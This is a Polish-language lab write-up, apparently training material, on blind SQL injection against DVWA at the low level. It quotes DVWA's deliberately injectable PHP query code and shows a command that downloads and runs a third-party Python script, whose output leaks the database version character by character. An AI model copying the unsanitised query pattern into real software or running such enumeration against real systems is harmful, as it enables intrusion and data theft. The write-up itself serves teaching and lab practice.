# SQLi (blind) - SQL injection (blind)
## Opis techniki
<blockquote> Ślepe wstrzyknięcie SQL jest identyczne z normalnym wstrzyknięciem SQL, z wyjątkiem tego, że gdy atakujący próbuje wykorzystać aplikację, zamiast otrzymać użyteczny komunikat o błędzie otrzymuje generyczną stronę określoną przez programistę. Sprawia to, że wykorzystanie ataku SQL Injection jest trudniejsze, ale nie niemożliwe. Atakujący nadal może wykraść dane, zadając serię pytań za pomocą instrukcji SQL i monitorując odpowiedź aplikacji internetowej (na przykład zwrócona prawidłowa wartość lub nagłówek 404).
</blockquote>

## DVWA labs

- [DVWA SQLi (blind) #1 - Low](#dvwa-sqli-blind-1---low)

Powtórzenie podanych przykładów wymaga zmiany adresu IP oraz tokenu sesji.

<br/>

## DVWA SQLi (blind) #1 - low
Cel: uzyskanie wersji bazy danych.

Interakcja z bazą danych pozwala na uzyskanie informacji o istnieniu danego rekordu:
![image](https://github.com/249064/CBE-BAW-2023/assets/133172137/ca1a1559-0152-49e0-9748-5770d53a623c)

bądź jego braku:

![image](https://github.com/249064/CBE-BAW-2023/assets/133172137/71369322-56b4-4d9e-9178-49f5f2c04d0a)

Na poziomie niskim zapytanie SQL wykorzystuje surowe dane wejściowe, które są bezpośrednio kontrolowane przez atakującego. Jedyne co trzeba zrobić, to uciec z zapytania, a następnie wykonać dowolne zapytanie SQL.

#### Kod źródłowy `PHP` 

```php

<?php

if( isset( $_GET[ 'Submit' ] ) ) {
    // Get input
    $id = $_GET[ 'id' ];

    // Check database
    $getid  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $getid ); // Removed 'or die' to suppress mysql errors

    // Get results
    $num = @mysqli_num_rows( $result ); // The '@' character suppresses errors
    if( $num > 0 ) {
        // Feedback for end user
        echo '<pre>User ID exists in the database.</pre>';
    }
    else {
        // User wasn't found, so the page wasn't!
        header( $_SERVER[ 'SERVER_PROTOCOL' ] . ' 404 Not Found' );

        // Feedback for end user
        echo '<pre>User ID is MISSING from the database.</pre>';
    }

    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);
}

?>
```
Do enumeracji kolejnych pozycji nazwy bazy danych wykorzystany został skrypt python przygotowany przez Crypto-Cat.

#### Komenda `bash` 

```bash
wget https://raw.githubusercontent.com/Crypto-Cat/CTF/main/web/DVWA/8-sqli.py
python3 8-sqli.py

[...]

[*] Found char(1): 5
[*] Found char(2): .
[*] Found char(3): 5
[*] Found char(4): .
[*] Found char(5): 6
[*] Found char(6): 1
[*] Found char(7): -
[*] Found char(8): 0
[*] Found char(9): u
[*] Found char(10): b
[*] Found char(11): u
[*] Found char(12): n
[*] Found char(13): t
[*] Found char(14): u
[*] Found char(15): 0
[*] Found char(16): .
[*] Found char(17): 1
[*] Found char(18): 4
[*] Found char(19): .
[*] Found char(20): 0
[*] Found char(21): 4
[*] Found char(22): .
[*] Found char(23): 1
[+] DB Version: 5.5.61-0ubuntu0.14.04.1
```

Otrzymaną wartość można wykorzystać do znalezienia znanych podatności bazy danych.
<br/>

<br/>
<br/>



<br/>
